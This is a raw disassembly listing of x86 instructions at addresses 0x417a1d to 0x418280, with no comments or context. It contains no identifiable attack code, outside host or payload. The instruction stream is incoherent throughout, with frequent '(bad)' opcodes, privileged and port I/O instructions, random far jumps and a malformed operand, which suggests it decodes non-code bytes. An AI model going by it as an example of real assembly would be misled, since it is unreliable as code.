  417a1d:	mov    al,0x1a
  417a1f:	call   0xbaa7:0x4c3090f3
  417a26:	adc    BYTE PTR [esp+edi*4],al
  417a29:	ds mov al,ds:0xf0aaa2a
  417a30:	adc    eax,0x534c5a50
  417a35:	out    dx,eax
  417a36:	pusha  
  417a37:	dec    ecx
  417a38:	popf   
  417a39:	or     bh,BYTE PTR [ebp+ebx*4-0x3fc81db4]
  417a40:	push   edx
  417a41:	(bad)  
  417a43:	fldz   
  417a45:	mov    eax,0x899b793d
  417a4a:	ja     0x417a14
  417a4c:	rsqrtps xmm5,XMMWORD PTR [ebp-0x554ffad5]
  417a53:	(bad)  
  417a54:	dec    eax
  417a55:	mov    ah,0x13
  417a57:	or     al,0x15
  417a59:	sbb    DWORD PTR [esi],ecx
  417a5b:	fs push eax
  417a5d:	mov    eax,ds:0xa4b5d338
  417a62:	dec    edx
  417a63:	mov    ebp,0x89ee0231
  417a68:	sbb    DWORD PTR [eax+0x6c8d826b],esi
  417a6e:	sti    
  417a6f:	or     DWORD PTR [ebp-0x1e],eax
  417a72:	out    0xa8,al
  417a74:	push   0x10b87a1d
  417a79:	(bad)  
  417a7a:	iret   
  417a7b:	adc    BYTE PTR [edx-0x4fb6a777],0x90
  417a82:	lahf   
  417a83:	xchg   DWORD PTR [ecx+0x53],edi
  417a86:	loope  0x417abb
  417a88:	mov    BYTE PTR [edi-0x39],cl
  417a8b:	int    0x35
  417a8d:	xchg   ebp,eax
  417a8e:	or     al,0x95
  417a90:	sub    al,0x26
  417a92:	add    eax,0x3f183f8f
  417a97:	iret   
  417a98:	das    
  417a99:	xor    esi,DWORD PTR [esi-0x1a]
  417a9c:	fcom   DWORD PTR [ecx-0x4d]
  417a9f:	aam    0xf
  417aa1:	inc    edi
  417aa2:	shl    DWORD PTR [ebx],1
  417aa4:	inc    esi
  417aa5:	cs push ss
  417aa7:	xchg   ebx,eax
  417aa8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417aa9:	inc    edi
  417aaa:	dec    ebx
  417aab:	mov    dl,0x88
  417aad:	cmp    esp,DWORD PTR [edi+eax*8]
  417ab0:	add    DWORD PTR [esi+edi*2],ecx
  417ab3:	jnp    0x417aae
  417ab5:	cdq    
  417ab6:	pop    edi
  417ab7:	repnz and eax,edi
  417aba:	scas   al,BYTE PTR es:[edi]
  417abb:	adc    BYTE PTR [eax],bh
  417abd:	mov    al,0x4c
  417abf:	xchg   DWORD PTR [esi],edi
  417ac1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ac2:	leave  
  417ac3:	and    BYTE PTR [ebp+0x7b],cl
  417ac6:	push   esp
  417ac7:	out    dx,eax
  417ac8:	std    
  417ac9:	mov    al,0xc0
  417acb:	sbb    DWORD PTR [eax+0x6316d3e6],edi
  417ad1:	mov    dh,0x8a
  417ad3:	imul   DWORD PTR [ecx-0x15fb23de]
  417ad9:	xchg   ebx,eax
  417ada:	fdiv   st,st(3)
  417adc:	or     eax,0x7ab1c9c4
  417ae1:	test   BYTE PTR [ebx],bl
  417ae3:	retf   
  417ae4:	into   
  417ae5:	retf   
  417ae6:	out    0x4a,al
  417ae8:	(bad)  
  417ae9:	pop    es
  417aea:	fidivr WORD PTR ds:0xb851553b
  417af0:	xchg   ebp,eax
  417af1:	outs   dx,BYTE PTR ds:[esi]
  417af2:	arpl   WORD PTR [edi+0x28],si
  417af5:	mov    dh,bl
  417af7:	and    eax,0xe46e80af
  417afc:	fldcw  WORD PTR [ecx]
  417afe:	sub    BYTE PTR [ebp+0x40978f91],ah
  417b04:	je     0x417b02
  417b06:	mov    cl,0x40
  417b08:	push   ebx
  417b09:	cmp    edi,edi
  417b0b:	test   eax,eax
  417b0d:	(bad)  
  417b0f:	mov    edx,0xad068435
  417b14:	dec    edx
  417b15:	push   0x12
  417b17:	inc    esp
  417b18:	pop    es
  417b19:	push   0x1f
  417b1b:	test   al,0xef
  417b1d:	mov    ds:0x8d473818,al
  417b22:	sbb    eax,0x47b611db
  417b27:	sub    eax,0x846ad4ca
  417b2c:	mov    DWORD PTR ds:0xb465fb96,edx
  417b32:	sub    DWORD PTR [ecx+edx*4-0x3],esp
  417b36:	dec    ebp
  417b37:	dec    esp
  417b38:	add    eax,0x1d547ade
  417b3d:	leave  
  417b3e:	xor    DWORD PTR [ebp-0x26147237],ebp
  417b44:	cmp    BYTE PTR [edi+0x34ac7f8b],0xf2
  417b4b:	scas   al,BYTE PTR es:[edi]
  417b4c:	test   al,0x4d
  417b4e:	adc    bh,al
  417b50:	or     ebp,ebx
  417b52:	xchg   ebx,eax
  417b53:	cmp    al,0x3f
  417b55:	xchg   ecx,eax
  417b56:	(bad)  
  417b58:	mov    ah,0xa0
  417b5a:	sub    cl,BYTE PTR [edi+eax*8+0x10]
  417b5e:	pop    es
  417b5f:	int3   
  417b60:	jle    0x417b93
  417b62:	in     al,dx
  417b63:	xor    al,0x6a
  417b65:	push   ebp
  417b66:	xor    eax,0x4ce28f67
  417b6b:	outs   dx,DWORD PTR ds:[esi]
  417b6c:	cmp    BYTE PTR [edi+0x46],dh
  417b6f:	ss loope 0x417be5
  417b72:	sub    al,0x28
  417b74:	stc    
  417b75:	adc    BYTE PTR [eax-0x71],cl
  417b78:	sub    eax,0x5fbfa308
  417b7d:	in     eax,0xa
  417b7f:	popf   
  417b80:	iret   
  417b81:	xchg   ebx,eax
  417b82:	cs dec ebp
  417b84:	sbb    ch,ah
  417b86:	or     ecx,DWORD PTR [ebx-0x41]
  417b89:	inc    ecx
  417b8a:	hlt    
  417b8b:	or     DWORD PTR [eax+0x6e],edi
  417b8e:	daa    
  417b8f:	inc    eax
  417b90:	dec    esp
  417b91:	js     0x417bd8
  417b93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b94:	push   ecx
  417b95:	jg     0x417b64
  417b97:	aad    0x3c
  417b99:	inc    ebp
  417b9a:	nop
  417b9b:	mov    edx,0xc27bf526
  417ba0:	arpl   WORD PTR [ecx+eiz*2+0x2250ef0d],sp
  417ba7:	xchg   ebx,eax
  417ba8:	shr    BYTE PTR [esi],1
  417baa:	test   al,0x75
  417bac:	icebp  
  417bad:	sbb    DWORD PTR [ebx+0x6244e357],eax
  417bb3:	push   es
  417bb4:	mov    dl,0x84
  417bb6:	push   ss
  417bb7:	div    DWORD PTR [eax+ecx*4+0x1d0429ac]
  417bbe:	mov    dh,0x35
  417bc0:	mov    BYTE PTR [esi+0x2715a7b5],cl
  417bc6:	enter  0x7e06,0xb
  417bca:	dec    ebp
  417bcb:	sbb    eax,0xd7d045a0
  417bd0:	adc    eax,0x3bf62452
  417bd5:	repz pushf 
  417bd7:	retf   0x4181
  417bda:	push   esi
  417bdb:	sbb    DWORD PTR [eax-0x5c8b1d98],ebp
  417be1:	jp     0x417c2c
  417be3:	daa    
  417be4:	pop    ecx
  417be5:	add    al,0xa3
  417be7:	shl    DWORD PTR [edx+0x263119ea],1
  417bed:	scas   al,BYTE PTR es:[edi]
  417bee:	adc    eax,0xa0abd64d
  417bf3:	jp     0x417baf
  417bf5:	dec    ebx
  417bf6:	in     eax,dx
  417bf7:	mov    bl,0x11
  417bf9:	pop    ss
  417bfa:	out    0xa9,al
  417bfc:	pop    edi
  417bfd:	xchg   esi,eax
  417bfe:	(bad)  
  417bff:	mov    dl,0x1b
  417c01:	sub    edi,esp
  417c03:	(bad)  
  417c04:	std    
  417c05:	cwde   
  417c06:	xor    esp,DWORD PTR [ebp-0x3c9bd176]
  417c0c:	fsubrp st(5),st
  417c0e:	or     esi,esi
  417c10:	bound  eax,QWORD PTR [ebx-0x1803a295]
  417c16:	sbb    dh,BYTE PTR [eax+edx*1-0x13]
  417c1a:	sbb    BYTE PTR [eax+0x7e825aae],dh
  417c20:	sub    DWORD PTR [edi+esi*2+0x1699e040],edi
  417c27:	mov    cl,0xe
  417c29:	fist   WORD PTR ds:0x16e76f72
  417c2f:	push   edi
  417c30:	cwde   
  417c31:	xor    eax,ebp
  417c33:	cs jmp 0x417be1
  417c36:	sub    DWORD PTR es:[edx],0x6e
  417c3a:	dec    edi
  417c3b:	or     esp,DWORD PTR [eax-0x1c3bbd16]
  417c41:	and    BYTE PTR [edx-0x39],bl
  417c44:	ror    DWORD PTR [eax-0x662da111],0x68
  417c4b:	ficom  WORD PTR [ecx]
  417c4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c4e:	push   ebp
  417c4f:	and    BYTE PTR [edi],0x61
  417c52:	test   DWORD PTR [edx],ebx
  417c54:	nop
  417c55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c56:	dec    ebx
  417c57:	push   esi
  417c58:	push   ds
  417c59:	shr    DWORD PTR [edi-0x3b028c92],1
  417c5f:	or     al,0x86
  417c61:	add    ecx,edi
  417c63:	push   ds
  417c64:	adc    ax,0x3119
  417c68:	int3   
  417c69:	inc    ebp
  417c6a:	in     al,0xcf
  417c6c:	jno    0x417c0a
  417c6e:	inc    edi
  417c6f:	xor    eax,0xf59475bd
  417c74:	jmp    0xd488:0x5821e185
  417c7b:	adc    BYTE PTR [ebp-0x32e5a480],al
  417c81:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  417c83:	inc    edx
  417c84:	add    eax,0x6b912574
  417c89:	enter  0x8a10,0x54
  417c8d:	(bad)  
  417c8e:	cs xor eax,0x86612576
  417c94:	sbb    eax,0x623d848c
  417c99:	icebp  
	...
  417d12:	add    BYTE PTR [eax],al
  417d14:	mov    esp,0xf767f68f
  417d19:	jg     0x417cd8
  417d1b:	fist   WORD PTR [esi+0x25ba792d]
  417d21:	sub    DWORD PTR [edx+0x11ff361],edi
  417d27:	add    BYTE PTR [esi+0x7],ch
  417d2a:	add    BYTE PTR [eax],al
  417d2c:	jno    0x417cb0
  417d2e:	pop    ebx
  417d2f:	mov    ebx,0x14340932
  417d34:	int    0x7a
  417d36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d37:	mov    ecx,0x6592568e
  417d3c:	sub    al,0xc4
  417d3e:	retf   
  417d3f:	sbb    edi,esp
  417d41:	aam    0xcc
  417d43:	xor    al,0xf5
  417d45:	push   ecx
  417d46:	fcos   
  417d48:	sub    cl,BYTE PTR [esi+esi*4]
  417d4b:	adc    eax,0x4393d189
  417d50:	(bad)  
  417d51:	xor    DWORD PTR [ebp+0x20],esp
  417d54:	mov    ds,WORD PTR [esi-0x28c1bb69]
  417d5a:	dec    ebp
  417d5b:	inc    edx
  417d5c:	stos   BYTE PTR es:[edi],al
  417d5d:	imul   eax,DWORD PTR [esi+0x285d1bbc],0x99bd428
  417d67:	jge    0x417d6c
  417d69:	adc    BYTE PTR ds:0x39dd9c43,ch
  417d6f:	out    0xa1,al
  417d71:	sub    BYTE PTR [ecx-0x56],bl
  417d74:	sbb    al,0xd8
  417d76:	add    eax,0x1bc2fce7
  417d7b:	stc    
  417d7c:	hlt    
  417d7d:	sbb    edx,esp
  417d7f:	adc    ah,0x7d
  417d82:	mov    ecx,0xe0bedf52
  417d87:	aam    0xa8
  417d89:	or     al,0x71
  417d8b:	xchg   ebx,eax
  417d8c:	and    al,0x0
  417d8e:	mov    cl,0xc1
  417d90:	jne    0x417d43
  417d92:	push   edx
  417d93:	aas    
  417d94:	or     eax,0x44d606c8
  417d99:	adc    bh,bl
  417d9b:	loop   0x417dd0
  417d9d:	loop   0x417d5a
  417d9f:	cmp    bh,BYTE PTR [eax]
  417da1:	call   0x41d3:0xbbfe0ad2
  417da8:	cs jb  0x417d3b
  417dab:	dec    esi
  417dac:	ror    DWORD PTR [eax-0x31237ec5],1
  417db2:	mov    ebp,0xd2e9d26c
  417db7:	pop    ds
  417db8:	or     bh,BYTE PTR [edx]
  417dba:	icebp  
  417dbb:	xchg   edx,eax
  417dbc:	cmp    DWORD PTR [ebp-0x21],ebp
  417dbf:	mov    ebx,DWORD PTR [ebx+0x53ec4868]
  417dc5:	adc    al,BYTE PTR [eax+0x79106d88]
  417dcb:	mov    ah,0x35
  417dcd:	cdq    
  417dce:	adc    al,bh
  417dd0:	clc    
  417dd1:	xchg   ebx,eax
  417dd2:	jp     0x417e0a
  417dd4:	sbb    DWORD PTR [edi+0x63],0x6f
  417dd8:	stc    
  417dd9:	xor    bl,BYTE PTR [esi+0x71]
  417ddc:	or     al,0x6a
  417dde:	jne    0x417d93
  417de0:	and    DWORD PTR [ecx-0x5d],ebp
  417de3:	pop    ebx
  417de4:	pop    edi
  417de5:	dec    eax
  417de6:	push   esi
  417de7:	or     BYTE PTR [ebp-0x4d],bh
  417dea:	or     al,0xab
  417dec:	jo     0x417d6f
  417dee:	data16 out dx,al
  417df0:	fisttp DWORD PTR ds:0xa1ef2e27
  417df6:	mov    al,ds:0x6b03a2de
  417dfb:	mov    edx,0xb3ad0cf2
  417e00:	nop
  417e01:	pop    edx
  417e02:	mov    dh,0x61
  417e04:	inc    edi
  417e05:	lahf   
  417e06:	not    BYTE PTR [eax]
  417e08:	call   0x6dec9ce5
  417e0d:	xlat   BYTE PTR ds:[ebx]
  417e0e:	mov    bh,0x6c
  417e10:	stos   DWORD PTR es:[edi],eax
  417e11:	call   0xfd6b340c
  417e16:	aad    0xbf
  417e18:	sahf   
  417e19:	cmp    BYTE PTR [ecx+ebp*8+0x6cd29d1f],bl
  417e20:	retf   0xd533
  417e23:	xor    ebx,eax
  417e25:	cmp    BYTE PTR [edx+0x4d],dl
  417e28:	hlt    
  417e29:	mov    ecx,0x45529205
  417e2e:	dec    ecx
  417e2f:	inc    ebp
  417e30:	pusha  
  417e31:	jl     0x417e21
  417e33:	pop    ss
  417e34:	hlt    
  417e35:	inc    esi
  417e36:	div    DWORD PTR [ecx+0x6e]
  417e39:	nop
  417e3a:	cwde   
  417e3b:	mov    dh,0x10
  417e3d:	jmp    DWORD PTR [ecx-0x2f]
  417e40:	mov    eax,ds:0xcd1ab857
  417e45:	stos   BYTE PTR es:[edi],al
  417e46:	div    BYTE PTR [edx]
  417e48:	pop    es
  417e49:	fwait
  417e4a:	mov    bh,0x9f
  417e4c:	lea    ecx,[edi+eiz*2-0x47]
  417e50:	cdq    
  417e51:	adc    eax,0x9c44f8bf
  417e56:	xchg   edx,eax
  417e57:	les    eax,FWORD PTR [esi]
  417e59:	in     al,0x37
  417e5b:	scas   eax,DWORD PTR es:[edi]
  417e5c:	imul   ecx,edx,0x92961493
  417e62:	fistp  WORD PTR [esi-0x128aa34e]
  417e68:	jb     0x417e3e
  417e6a:	enter  0xb0d2,0x6b
  417e6e:	imul   esp,DWORD PTR [edx+0x5],0x5bf52fae
  417e75:	(bad)  
  417e76:	stc    
  417e77:	mov    WORD PTR [edi-0x5],ss
  417e7a:	xor    DWORD PTR [edx],ecx
  417e7c:	es add bl,dh
  417e7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e80:	das    
  417e81:	sbb    DWORD PTR [edx+0x71ea7286],esp
  417e87:	enter  0xfc10,0xd
  417e8b:	inc    esi
  417e8c:	pusha  
  417e8d:	mov    ebx,0x479ca2b
  417e92:	mov    WORD PTR [eax+ecx*1],cs
  417e95:	add    esp,DWORD PTR [ebp+0x40554cb4]
  417e9b:	pop    ds
  417e9c:	mov    DWORD PTR [ebx],ecx
  417e9e:	mov    eax,0xa6070683
  417ea3:	lods   al,BYTE PTR ds:[esi]
  417ea4:	dec    ebp
  417ea5:	outs   dx,DWORD PTR ds:[esi]
  417ea6:	push   es
  417ea7:	(bad)  
  417ea8:	in     eax,0x83
  417eaa:	xchg   ah,bh
  417eac:	scas   al,BYTE PTR es:[edi]
  417ead:	(bad)  
  417eae:	pop    esi
  417eaf:	stos   BYTE PTR es:[edi],al
  417eb0:	and    cx,WORD PTR ds:0xc15f55b1
  417eb7:	frstor [edi+edi*1-0x292897ec]
  417ebe:	adc    ah,BYTE PTR [esi]
  417ec0:	sbb    edi,eax
  417ec2:	mov    eax,0x5537483d
  417ec7:	(bad)  
  417ec8:	std    
  417ec9:	ficomp DWORD PTR [ecx+0x2f491888]
  417ecf:	mov    ch,0xc1
  417ed1:	stos   DWORD PTR es:[edi],eax
  417ed2:	stos   BYTE PTR es:[edi],al
  417ed3:	sbb    eax,0xfbc177f0
  417ed8:	div    BYTE PTR [edi-0x3bd037ba]
  417ede:	cwde   
  417edf:	xor    ecx,DWORD PTR [ebx-0x113c5197]
  417ee5:	mov    eax,0xa1287454
  417eea:	js     0x417f44
  417eec:	inc    esp
  417eed:	leave  
  417eee:	cdq    
  417eef:	or     eax,0xe5f362ab
  417ef4:	pop    edx
  417ef5:	sub    ebx,ebx
  417ef7:	adc    bl,dl
  417ef9:	dec    eax
  417efa:	setnp  BYTE PTR [eax-0x3bae9e97]
  417f01:	das    
  417f02:	jecxz  0x417e8c
  417f04:	std    
  417f05:	add    eax,0x467f421b
  417f0a:	fs dec ebp
  417f0c:	cmp    ah,cl
  417f0e:	icebp  
  417f0f:	je     0x417f1a
  417f11:	push   ebx
  417f12:	adc    DWORD PTR [ebx],edx
  417f14:	mov    ?,edi
  417f16:	pop    eax
  417f17:	add    al,0x1
  417f19:	jb     0x417f7b
  417f1b:	enter  0x40e4,0x85
  417f1f:	fisttp QWORD PTR [esi+0x59]
  417f22:	cli    
  417f23:	pop    ebx
  417f24:	sahf   
  417f25:	js     0x417f6c
  417f27:	ins    BYTE PTR es:[edi],dx
  417f28:	inc    ebp
  417f29:	hlt    
  417f2a:	jl     0x417f63
  417f2c:	jb     0x417f14
  417f2e:	lds    edx,FWORD PTR [edi+ecx*1-0x65]
  417f32:	mov    BYTE PTR [esi+0x4e4019b4],dh
  417f38:	shl    BYTE PTR [ebx+0x6efccf85],cl
  417f3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f3f:	aam    0x26
  417f41:	push   0x1c
  417f43:	xchg   edi,eax
  417f44:	sub    BYTE PTR [eax],bh
  417f46:	ss retf 
  417f48:	mov    WORD PTR [ebx+0x8],ss
  417f4b:	ins    BYTE PTR es:[edi],dx
  417f4c:	jmp    0x417f66
  417f4e:	in     eax,0xe8
  417f50:	ins    DWORD PTR es:[edi],dx
  417f51:	ds js  0x417f35
  417f54:	inc    esi
  417f55:	pop    ss
  417f56:	aam    0xe1
  417f58:	icebp  
  417f59:	mov    BYTE PTR [ecx+0x68],dh
  417f5c:	xchg   ebx,eax
  417f5d:	cld    
  417f5e:	sbb    eax,0xa3491846
  417f63:	ss jg  0x417f2e
  417f66:	pop    es
  417f67:	loop   0x417f17
  417f69:	mul    BYTE PTR [edx+0x0]
  417f6c:	fadd   st,st(3)
  417f6e:	mov    ds:0xd898f11e,al
  417f73:	js     0x417f17
  417f75:	ds loope 0x417fe1
  417f78:	std    
  417f79:	xchg   ebp,eax
  417f7a:	call   0x9ba0:0x1a3d218d
  417f81:	test   eax,edi
  417f83:	jbe    0x417fd2
  417f85:	rcr    DWORD PTR [edi],0xa
  417f88:	mov    ah,0xfe
  417f8a:	mov    ds:0xdbaf1895,al
  417f8f:	add    DWORD PTR [esi-0x1a],0x113d3e7f
  417f96:	mov    edi,ecx
  417f98:	lahf   
  417f99:	push   ecx
  417f9a:	dec    ecx
  417f9b:	addr16 pop ebp
  417f9d:	in     eax,0x1a
  417f9f:	xor    esi,edi
  417fa1:	ja     0x418006
  417fa3:	and    BYTE PTR [edx-0x740d0233],bh
  417fa9:	xchg   ebx,eax
  417faa:	or     eax,0x3e2ad363
  417faf:	pusha  
  417fb0:	das    
  417fb1:	imul   ecx,DWORD PTR [eax-0x674cb2ee],0xc18a2e97
  417fbb:	add    dl,0xca
  417fbe:	jno    0x417f8f
  417fc0:	pop    ss
  417fc1:	das    
  417fc2:	outs   dx,DWORD PTR ds:[esi]
  417fc3:	jno    0x418007
  417fc5:	mov    al,0xb3
  417fc7:	gs sub ch,cl
  417fca:	jge    0x418005
  417fcc:	add    al,0xf9
  417fce:	jmp    0x417fea
  417fd0:	popa   
  417fd1:	stos   DWORD PTR es:[edi],eax
  417fd2:	jo     0x418035
  417fd4:	jns    0x417ff9
  417fd6:	sbb    BYTE PTR [ecx],bl
  417fd8:	mov    ds:0xdef8b10f,al
  417fdd:	mov    DWORD PTR [edi-0x566742e5],esi
  417fe3:	cdq    
  417fe4:	xchg   BYTE PTR [edx+0x22],ah
  417fe7:	cs mov dh,0x43
  417fea:	leave  
  417feb:	neg    BYTE PTR [esp]
  417fee:	sub    DWORD PTR [esi+edx*1],ebp
  417ff1:	mov    dh,0x3e
  417ff3:	sbb    al,al
  417ff5:	fdivr  st,st(6)
  417ff7:	xor    cl,BYTE PTR [edi+ecx*2+0x910ae9c]
  417ffe:	lods   al,BYTE PTR ds:[esi]
  417fff:	sti    
  418000:	fcom   DWORD PTR [eax+0x71]
  418003:	jmp    0xa4ba:0xed3e5395
  41800a:	cmp    al,0x76
  41800c:	fstp   DWORD PTR [ecx-0x5eb3a558]
  418012:	fild   WORD PTR [di]
  418015:	and    DWORD PTR [edx],esp
  418017:	xor    eax,0x560153d9
  41801c:	jnp    0x417fed
  41801e:	xchg   ebx,eax
  41801f:	xchg   DWORD PTR [ebx-0x15a07e6e],ebp
  418025:	jbe    0x418079
  418027:	lahf   
  418028:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418029:	aad    0x1d
  41802b:	add    DWORD PTR [edi-0x4d],edx
  41802e:	mov    edi,0x53d41ed5
  418033:	xchg   DWORD PTR [ebp-0xe],esp
  418036:	sbb    edi,DWORD PTR [ebx+ebp*8]
  418039:	cli    
  41803a:	pop    edi
  41803b:	repnz sub cl,bl
  41803e:	xlat   BYTE PTR ds:[ebx]
  41803f:	xchg   BYTE PTR [ebx-0x65663b4d],ah
  418045:	test   eax,0xc5238be1
  41804a:	shr    DWORD PTR [ebp-0x33430c11],1
  418050:	xchg   esi,eax
  418051:	mov    bl,0x33
  418053:	and    DWORD PTR [ebx+ecx*4-0x69c0ff84],ebp
  41805a:	repz add eax,0x56ebc466
  418060:	stos   BYTE PTR es:[edi],al
  418061:	jb     0x4180a4
  418063:	inc    eax
  418064:	cmp    dh,BYTE PTR [edx]
  418066:	push   ebp
  418067:	fisub  DWORD PTR [eax+0x2f]
  41806a:	push   esi
  41806b:	adc    DWORD PTR [ecx],eax
  41806d:	imul   edx,DWORD PTR [esi],0x40a9abb5
  418073:	pop    ebp
  418074:	nop
  418075:	push   ss
  418076:	mov    edx,0xdb14a0aa
  41807b:	cs xchg edx,eax
  41807d:	sub    DWORD PTR [edx-0x54754198],0x4
  418084:	in     eax,0x3a
  418086:	sbb    al,cl
  418088:	dec    ecx
  418089:	stos   DWORD PTR es:[edi],eax
  41808a:	leave  
  41808b:	js     0x41805f
  41808d:	cmp    al,0xb1
  418090:	lds    eax,FWORD PTR [eax]
  418092:	xchg   ebx,eax
  418093:	xchg   edi,eax
  418094:	in     al,dx
  418095:	push   cs
  418096:	and    DWORD PTR [eax],ebx
  418098:	ror    BYTE PTR [esi-0x26],1
  41809b:	pushf  
  41809c:	inc    esi
  41809d:	fcmovne st,st(1)
  41809f:	inc    edx
  4180a0:	inc    esi
  4180a1:	(bad)  
  4180a2:	(bad)  
  4180a3:	mov    ebx,0xb962b5ec
  4180a8:	mov    dh,BYTE PTR [eax+0x7d7539a3]
  4180ae:	mov    bl,0x56
  4180b0:	lea    esi,[ebx+0x3e]
  4180b3:	ret    
  4180b4:	in     eax,0xa
  4180b6:	sub    al,0x64
  4180b8:	sti    
  4180b9:	fsub   st,st(5)
  4180bb:	mov    ebp,0xf023544f
  4180c0:	push   ss
  4180c1:	aas    
  4180c2:	adc    dl,BYTE PTR [ebx]
  4180c4:	lock sub eax,DWORD PTR ds:[edi]
  4180c8:	jecxz  0x41804f
  4180ca:	js     0x4180d5
  4180cc:	es push ds
  4180ce:	pinsrw mm4,WORD PTR [eax-0x2f],0xc0
  4180d3:	add    ah,BYTE PTR [esi-0x69]
  4180d6:	or     DWORD PTR [edx+0x731fd067],0xe27b51c0
  4180e0:	(bad)  
  4180e1:	xor    edx,DWORD PTR [ebx+0x34558f1d]
  4180e7:	in     eax,0xed
  4180e9:	outs   dx,DWORD PTR ds:[esi]
  4180ea:	xchg   DWORD PTR [esi-0x47d3062e],edi
  4180f0:	or     BYTE PTR [ebx+0x635c457e],bl
  4180f6:	daa    
  4180f7:	adc    al,0x1f
  4180f9:	mov    ebx,0x70c4ca5
  4180fe:	xor    al,BYTE PTR [ecx-0x6ca10aeb]
  418104:	xor    bl,bl
  418106:	in     al,0xd0
  418108:	push   eax
  418109:	daa    
  41810a:	ror    BYTE PTR [ebp-0x79d76ac1],0x95
  418111:	cs push ebp
  418113:	mov    ebx,0x81503541
  418118:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418119:	inc    ebx
  41811a:	sbb    DWORD PTR [edi-0x37],eax
  41811d:	enter  0x2e6f,0x17
  418121:	clc    
  418122:	sbb    ah,BYTE PTR [esi-0x2aac5008]
  418128:	(bad)  
  418129:	jg     0x418157
  41812b:	xchg   edi,eax
  41812c:	mov    WORD PTR [ebx-0x6303b44b],ss
  418132:	sbb    DWORD PTR [ebp+0x4a],eax
  418135:	pop    esp
  418136:	sub    ah,bl
  418138:	mov    ebx,0x26dd514c
  41813d:	mov    bh,0xea
  41813f:	(bad)  
  418140:	jmp    0x669f5537
  418145:	xchg   edx,eax
  418146:	jmp    0xab59a751
  41814b:	push   eax
  41814c:	mov    edx,0x2e78dc88
  418151:	jmp    0x2252:0xdd3c59b9
  418158:	cmp    DWORD PTR [edi+edi*4],eax
  41815b:	cli    
  41815c:	push   ss
  41815d:	or     bl,BYTE PTR ds:0x953125ec
  418163:	int    0xfd
  418165:	jle    0x418179
  418167:	xchg   ebp,eax
  418168:	pop    edx
  418169:	or     al,0x51
  41816b:	call   0xf9384f5b
  418170:	dec    esi
  418171:	js     0x4181d7
  418173:	xor    DWORD PTR [ecx-0x80],edi
  418176:	fild   QWORD PTR [edx]
  418178:	scas   al,BYTE PTR es:[edi]
  418179:	jl     0x41815b
  41817b:	sbb    ah,0xc9
  41817e:	jbe    0x4181d8
  418180:	jmp    0x3f7f:0x5d787886
  418187:	pop    esi
  418188:	push   ebx
  418189:	sub    DWORD PTR [ecx],ecx
  41818b:	test   DWORD PTR [esi],esp
  41818d:	shl    BYTE PTR ds:0xfafd2b69,1
  418193:	and    DWORD PTR [ebp-0x5b],eax
  418196:	inc    ebp
  418197:	lods   eax,DWORD PTR ds:[esi]
  418198:	or     eax,0x57633e43
  41819d:	out    dx,al
  41819e:	jmp    DWORD PTR [ecx+0x34748aa7]
  4181a4:	rcr    dl,cl
  4181a6:	pop    esp
  4181a7:	cld    
  4181a8:	cli    
  4181a9:	pop    edx
  4181aa:	int    0x43
  4181ac:	xor    DWORD PTR [ecx-0x4e4f9ed6],eax
  4181b2:	inc    ebx
  4181b3:	dec    esi
  4181b4:	fwait
  4181b5:	imul   edx,DWORD PTR [edx],0xc9112dc5
  4181bb:	(bad)  
  4181bd:	mov    al,0xb8
  4181bf:	mov    dl,0xb7
  4181c1:	(bad)  
  4181c2:	mov    edx,DWORD PTR [edx+0x660037c9]
  4181c8:	pushf  
  4181c9:	pop    ds
  4181ca:	jmp    0xbbc7480c
  4181cf:	xor    eax,0xca3a5584
  4181d4:	rol    BYTE PTR [ecx-0x2e],1
  4181d7:	sub    bh,bl
  4181d9:	pop    eax
  4181da:	retf   
  4181db:	pop    es
  4181dc:	inc    edx
  4181dd:	inc    eax
  4181de:	or     cl,dl
  4181e0:	push   edi
  4181e1:	daa    
  4181e2:	ins    DWORD PTR es:[edi],dx
  4181e3:	daa    
  4181e4:	fldenv [ecx+eax*8+0x3fbcfbb9]
  4181eb:	js     0x418247
  4181ed:	mov    esi,0x7f9797a5
  4181f2:	cmp    BYTE PTR [ebx-0x2ae7cfe9],0x7b
  4181f9:	xor    BYTE PTR [edi-0x58],dl
  4181fc:	or     eax,ecx
  4181fe:	iret   
  4181ff:	sbb    al,0x9b
  418201:	int3   
  418202:	xlat   BYTE PTR ds:[ebx]
  418203:	lock sub DWORD PTR [edx-0x33deca20],ecx
  41820a:	les    ecx,FWORD PTR [edi-0x314052f8]
  418210:	out    0x26,al
  418212:	cmp    BYTE PTR [ebx],0xc9
  418215:	push   0x4a
  418217:	sbb    dl,BYTE PTR [esi]
  418219:	loop   0x418255
  41821b:	ficom  DWORD PTR [edx+0x1f60852a]
  418221:	out    0x67,eax
  418223:	shl    DWORD PTR [ebp+ecx*4+0x12e6b22e],0x83
  41822b:	and    DWORD PTR [ebx+0x3d293985],ecx
  418231:	inc    eax
  418232:	push   es
  418233:	pop    eax
  418234:	loop   0x4182ae
  418236:	xchg   bl,bl
  418238:	and    DWORD PTR [eax+0x0],esi
  41823b:	fiadd  DWORD PTR [ecx+0x49]
  41823e:	mov    dh,BYTE PTR [esi]
  418240:	push   0xf62e27d5
  418245:	fild   DWORD PTR [edi+0x174abdae]
  41824b:	cmp    cl,dh
  41824d:	mov    eax,0x4e024606
  418252:	xor    al,0x26
  418254:	aas    
  418255:	push   edi
  418256:	push   esp
  418257:	(bad)  
  418258:	ss or  al,0x48
  41825b:	jnp    0x4182cb
  41825d:	into   
  41825e:	addr16 ret 
  418260:	cmp    BYTE PTR [edi+0x3b5ecd5],dh
  418266:	cmp    al,0xda
  418268:	mov    edx,fs
  41826a:	xor    esp,DWORD PTR [esi+0x6b]
  41826d:	std    
  41826e:	jge    0x4182ca
  418270:	ds dec esp
  418272:	cs push edi
  418274:	mov    cs,eax
  418276:	jb     0x418249
  418278:	cmp    bh,BYTE PTR [edx]
  41827a:	add    ch,0x11
  41827d:	hlt    
  41827e:	and    ebp,edi
  418280:	adc    edx,DWORD PTR [esi-0x637d4b5e]
